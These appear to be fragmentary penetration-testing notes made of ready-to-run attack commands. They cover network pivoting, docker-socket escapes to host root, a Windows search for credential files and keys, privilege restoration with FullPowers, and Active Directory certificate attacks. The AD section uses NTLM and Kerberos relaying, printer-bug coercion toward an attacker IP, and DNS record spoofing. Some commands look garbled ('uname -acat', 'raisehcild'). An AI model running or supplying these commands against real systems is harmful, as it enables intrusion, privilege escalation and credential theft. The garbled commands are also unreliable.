...
![[Pasted image 20251219194631.png]]
...
- **SSH**
  ...
  -  SShuttle allows to perform pivoting similar to ligolo, without proxychains
	    ```bash
	    sudo sshuttle -r [USER]@[IP] --ssh-cmd 'ssh -i KEY' [INTRANET_CIDR]
	    ```
...
- **Ligolo**
  ...
  5. On the legolo server, add the listener
     ...
     ```bash
     listener_add --addr <PIVOT IP>:4444 --to [KALI_IP]:4444 --tcp 
     ```
	 The `PIVOT IP` is the one in `ifconfig` of the machine from which you have the pivot
  6. Open listener
...
- **adm:** read all logs in `/var/log` -> `aureport --tty | less`
- **disk:** &rarr; escalate to root:
  full access to any device in `/dev` &rarr; `debugfs`

- **docker:** &rarr; escalate to root (tty upgrade if not working)
...
- Basic Hunt
  ```bash
  ls -la /opt /var/mail /var/spool /var/tmp /var/backups /srv  /var/www /mnt
  ```
- Interesting files:
  ```bash
...
- User Owned Files
    ...
    ```bash
    find / -type f -user [group] 2>/dev/null | grep -v -E "/proc|/sys|/run|/var/lib|/usr/src|/usr/share|/usr/lib|/var/cache|/boot|/etc|/bin|/sbin|/include|/log|/local/lib/"
    ```
- User Readable Files
    ```bash
    find / -type f -readable 2>/dev/null | grep -v -E "/proc|/sys|/run|/var/lib|/usr/src|/usr/share|/usr/lib|/var/cache|/boot|/etc|/bin|/sbin|/include|/log|/local/lib/"
    ```
- KeyTab files:
- Browser:
...
ss -tulnap | grep -E "(LISTEN|ESTAB)|State"
```
...
### Sockets:
- See if there is a docker
```shell
netstat -a -p --unix
find / -iname "docker.sock" 2>/dev/null	
```

- If writable -> Direct privilege escalation without needing to be in docker group:
...
- `printenv`
- **Os Version:** 
	- `cat /etc/*-release && uname -acat`
- **Docker version**
	- `docker -v`
	- `curl http://192.168.65.7:2375/version` -> [Exploit](https://blog.qwertysecurity.com/Articles/blog3)
- **Pivot** 
	- -> the gateway is the host that is running the docker -> internal scan
- **Sockets** 
	- `{bash} find / -name docker.sock 2>/dev/null `
	- If there is socket, it's mounted from the host into the container -> you can communicate to the daemon through the socket -> control the host
	- [docker bin32](https://get.docker.com/builds/Linux/i386/docker-latest.tgz) / [docker_bin_64](https://get.docker.com/builds/Linux/x86_64/docker-latest.tgz) to interact
	```bash
	# Check what containers/images exist
	docker -H unix:///path/to/docker.sock ps
	docker -H unix:///path/to/docker.sock images
	
	# Create privileged container mounting host root
	/tmp/docker -H unix:///path/to/docker.sock run --rm -it --privileged -v /:/hostsystem ubuntu bash
	
	# Once in privileged container:
	chroot /hostsystem bash 
	
	# Or see interesting files
...
-  Enable all privileges:
	- Try switching from cmd to powershell (could auto enable)
	- Service account (LOCAL/NETWORK group):  [FullPowers](https://github.com/itm4n/FullPowers)
...
#### SeEnableDelegationPrivilege (AD)
Allows **Unconstrained Delegation**, a setting that allows a computer (or service) to **impersonate a user to any other service** in the network.

**Requirements**
- MAQ > 0 -> create new pc account
  ```bash
  addcomputer.py -computer-name <FAKEHOST> -computer-pass 'P@ssword123!P@ssword123!' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
  ```
- GenericAll on a PC account -> change the PC configuration

**[Exploit](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/unconstrained-delegation.html?highlight=seenab#abusing-unconstrained-delegation-with-an-attacker-created-computer)** -> Unconstrained delegation
...
#### Local Service
- Restore `SeImpersonate` -> Transfer & execute`FullPowers.exe`
#### Network Service
- Restore `SeImpersonate` -> Transfer & execute`FullPowers.exe`
#### Print Operators
...
- Write permission in the output folder

-> Create a junction from the output folder to a folder that you want to write (e.g. web shell) `mklink /j [SRC_DIR] [DEST_DIR]`
## Credential Hunting
...
- **Important files**, in root
  ```cmd
  cmd /c 'dir /a /s /b id_rsa id_ed* credentials.db credentials.xml master.key access_tokens.db legacy_credentials accessTokens.json azureProfile.json netsetup.log iis6.log appsettings.json "Custom Dictionary.txt" sysprep.xml sysprep.inf php.ini my.cnf my.ini cred.xml confCons.xml docker-compose.yml Dockerfile web.config_sample server.xml confCons.xml tomcat-users.xml kibana.*  *.passwd ultravnc.ini smtp.* elasticsearch.* sql.ini FreeSSHDservice.ini key3.db key4.db logins.json places.sqlite credentials.xml config.xml httpd-xampp.conf httpd.conf vnc_viewer.ini AppEvent.Evt SecEvent.Evt SiteList.xml NTUSER.dat unattend.xml Unattended.xml Groups.xml master.key ConsoleHost_history.txt Cookies Cookie "Login Data" cookies.sqlite connections.xml authentication.conf plum.sqlite RDCMan.settings sam.bak sam.old sam.save sam.sav system.old ERRORLOG.bak system.sav system.bak StickyNotes.snt splunk.secret system.save sessionstore-backups *.kirbi *.keytab *.kt *.ccache nsclient.ini "VNC Install.reg" *.git-credentials config.ini index.dat *.kdbx *.vhd *.vhdx *.vmdk *.rdp *.cred *.vba *.eps 2>nul'
  ```
...
- **WSL**: allows you to run Linux distributions natively on Windows
	- `wsl` to spawn a shell
	- `wsl [COMMAND]` to execute single commands (e.g. revshell)
...
## Basics
### Create a PC account
The MAQ is an ldap module that one can check with `nxc ldap -M MAQ`. It represets the number of computer accounts that one user can create
```bash
addcomputer.py [DOMAIN]/[USER]:'[PASS]' -dc-ip [IP]
```
## Certificate Abuse
**Bloodhound** 
-> cypher -> shortest paths -> Enrollment rights -> look for SIDs (i.e. deleted users)
...
- **`[+] User Enrollable Principals`** -> who can perform the attack (user or group)
...
#### NTLM: True
NTLM relay attack targeting a HTTP endpoint *(doesn't require to be **enrollable principals**)*

1. listen for inbound connections and relay them to the web enrollment
	```bash
	ntlmrelayx.py -t [CA_URL] --adcs -smb2support --template KerberosAuthentication
	```
	- `CA_URL` -> the certipy output under `Web Enrollment URL`, or `http://<DC_FQDN>/certsrv/certfnsh.asp`
...
2. Wait or make victims authenticate to steal the certificate
	...
	- `Printer Spooler` service -> [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
	  ...
	  python3 printerbug.py domain/user:"pwd"@[VICTIM_IP] [RELAYX_IP]
		```
#### NTLM: False
Only Kerberos authentication is allowed -> relaying over kerberos -> reflection over HTTP

1. DNS spoofing
   ```bash
   bloodyAD -u <user> -p <pwd> -d <domain> -k --host <DC_FQDN> add dnsRecord <DC_HOSTNAME>UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <Kali_IP>
   ```
2. Open a relaying over Kerberos
   ```bash
   krbrelayx.py -t [CA_URL] --adcs --template DomainController -l LOOT -v 'DC$'
   ```
	- `CA_URL` -> the certipy output under `Web Enrollment URL`, or `http://<DC_FQDN>/certsrv/certfnsh.asp`
	- `TEMPLATE` -> `DomainController/Machine/User`
	- `-v` -> DC samaccountname
3. Launch coercing attacks
   ```bash
   nxc smb <AUTH> -M coerce_plus -o LISTENER=<DC_HOSTNAME>UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
   ```
4. Get NTLM hash -> secretsdump
   ```bash
...
1. Check if there are some deleted users -> *Outcome can change depending on the privileges of the user*
   ```powershell
...
### Child -> Parent
1. Auto-Exploitation NXC
	1. `nxc ldap [CHILD_DC_IP] [DOMAIN_ADMIN_AUTH] -M raisehcild -o [MODULE_OPTIONS]`
